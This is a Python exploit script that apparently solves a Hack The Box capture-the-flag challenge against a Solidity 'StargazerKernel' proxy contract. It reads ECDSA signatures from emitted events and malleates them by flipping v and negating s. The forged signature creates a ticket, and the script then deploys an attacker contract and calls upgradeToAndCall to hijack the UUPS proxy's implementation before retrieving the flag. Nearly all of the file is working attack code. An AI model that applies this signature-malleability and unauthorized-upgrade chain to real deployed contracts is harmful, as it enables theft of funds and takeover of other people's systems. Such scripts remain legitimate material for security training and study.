#!/usr/bin/env python3

import time
import json
from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)


if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    
    with open("contracts/out/StargazerKernel.sol/StargazerKernel.json") as f:
        target_abi = json.load(f)["abi"]
    
    with open("contracts/out/Exploit.sol/Exploit.json") as f:
        exploit_compiled = json.load(f)
    exploit_abi = exploit_compiled["abi"]
    exploit_bytecode = exploit_compiled["bytecode"]["object"]

    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")

    StargazerKernel = w3.eth.contract(address=target_addr, abi=target_abi)
    try:
        sightings = StargazerKernel.functions.getStarSightings("Starry-SPURR_001").call()
        print(f"[+] Star Sightings for 'Starry-SPURR_001': {sightings}")
    except Exception as e:
        print(f"[!] Failed to call getStarSightings: {e}")

    event_filter = StargazerKernel.events.PASKATicketCreated.create_filter(from_block=0)
    events = event_filter.get_all_entries()
    print(f"[*] Found {len(events)} PASKATicketCreated events")
    
    for event in events:
        print(f"[*] Processing PASKATicketCreated event:")
        hashedRequest = event.args.ticket.hashedRequest
        signature = event.args.ticket.signature
        print(f"    [>] hashedRequest: {hashedRequest.hex()}")
        print(f"    [>] signature: {signature.hex()}")
        
        # malleate the signature
        if len(signature) != 65:
            print("[!] Invalid signature length.")
            continue
        r = signature[:32]
        s = signature[32:64]
        v = signature[64]
        
        if v not in [27, 28]:
            print("[!] Invalid recovery id.")
            continue
        
        manipulated_v = 27 if v == 28 else 28
        
        r_int = int.from_bytes(r, byteorder='big')
        s_int = int.from_bytes(s, byteorder='big')
        
        # s' = -s mod n
        half_curve = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
        s_int = -s_int % half_curve
        
        manipulated_s = s_int.to_bytes(32, byteorder='big')


        malleated_signature = r + manipulated_s + bytes([manipulated_v])
        print(f"    [>] Malleated Signature: {malleated_signature.hex()}")
        print(f"    [>] r: {r.hex()}")
        print(f"    [>] s: {s.hex()}, s': {manipulated_s.hex()}")
        print(f"    [>] v: {v}")
        break

    player_account = Account.from_key(player_pvk)
    try:
        tx_create_ticket = StargazerKernel.functions.createPASKATicket(malleated_signature).build_transaction({
            'from': player_account.address,
            'nonce': w3.eth.get_transaction_count(player_account.address)
        })
        signed_tx_create_ticket = player_account.sign_transaction(tx_create_ticket)
        tx_hash_create_ticket = w3.eth.send_raw_transaction(signed_tx_create_ticket.raw_transaction)
        print(f"    [>] Sent createPASKATicket transaction: {tx_hash_create_ticket.hex()}")
        rcpt_create_ticket = w3.eth.wait_for_transaction_receipt(tx_hash_create_ticket)
        print(f"    [>] createPASKATicket transaction mined. Status: {rcpt_create_ticket.status}")    
    except Exception as e:
        print(f"[!] Failed to send createPASKATicket transaction: {e}")

    if rcpt_create_ticket.status != 1:
        print("[!] createPASKATicket transaction failed.")
        exit(1)

    # deploy exploit contract
    try:
        Exploit = w3.eth.contract(abi=exploit_abi, bytecode=exploit_bytecode)
        deploy_tx = Exploit.constructor().build_transaction({
                'from': player_account.address,
                'nonce': w3.eth.get_transaction_count(player_account.address)
            })
        tx_hash_deploy = w3.eth.send_transaction(deploy_tx)
        print(f"    [>] Sent deploy exploit contract transaction: {tx_hash_deploy.hex()}")
        rcpt_deploy = w3.eth.wait_for_transaction_receipt(tx_hash_deploy)
        print(f"    [>] Deploy exploit contract transaction mined. Status: {rcpt_deploy.status}")
        exploit_addr = rcpt_deploy.contractAddress
        print(f"    [>] Exploit contract deployed at: {exploit_addr}")
    except Exception as e:
        print(f"[!] Failed to send deploy exploit contract transaction: {e}")

    try:
        tx_upgrade = StargazerKernel.functions.upgradeToAndCall(exploit_addr, b'').build_transaction({
            'from': player_account.address,
            'nonce': w3.eth.get_transaction_count(player_account.address)
        })
        signed_tx_upgrade = player_account.sign_transaction(tx_upgrade)
        tx_hash_upgrade = w3.eth.send_raw_transaction(signed_tx_upgrade.raw_transaction)
        print(f"    [>] Sent upgradeToAndCall transaction: {tx_hash_upgrade.hex()}")
        rcpt_upgrade = w3.eth.wait_for_transaction_receipt(tx_hash_upgrade)
        print(f"    [>] upgradeToAndCall transaction mined. Status: {rcpt_upgrade.status}")
    except Exception as e:
        print(f"[!] Failed to send upgradeToAndCall transaction: {e}")

    # get ERC-1967 proxy new implementation address
    implementation_slot = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc' # bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)
    implementation_addr_slot = w3.eth.get_storage_at(StargazerKernel.address, implementation_slot)
    implementation_address = '0x' + implementation_addr_slot[-20:].hex()
    print(f"[+] UUPS Proxy Implementation Address: {implementation_address}")
    Exploit = w3.eth.contract(address=target_addr, abi=exploit_abi)

    try:
        tx_override = Exploit.functions.overrideStargazerMemory().build_transaction({
            'from': player_account.address,
            'nonce': w3.eth.get_transaction_count(player_account.address)
        })
        signed_tx_override = player_account.sign_transaction(tx_override)
        tx_hash_override = w3.eth.send_raw_transaction(signed_tx_override.raw_transaction)
        print(f"    [>] Sent overrideStargazerMemory transaction: {tx_hash_override.hex()}")
        rcpt_override = w3.eth.wait_for_transaction_receipt(tx_hash_override)
        print(f"    [>] overrideStargazerMemory transaction mined. Status: {rcpt_override.status}")
    except Exception as e:
        print(f"[!] Failed to send overrideStargazerMemory transaction: {e}")


    try:
        star1_sightings = Exploit.functions.getStarSightings("Starry-SPURR_001").call()
        print(f"[+] Star Sightings for 'Starry-SPURR_001': {star1_sightings}")
        star2_sightings = Exploit.functions.getStarSightings("Nova-GLIM_007").call()
        print(f"[+] Star Sightings for 'Nova-GLIM_007': {star2_sightings}")
    except Exception as e:
        print(f"[!] Failed to call getStarSightings: {e}")

    # get flag
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    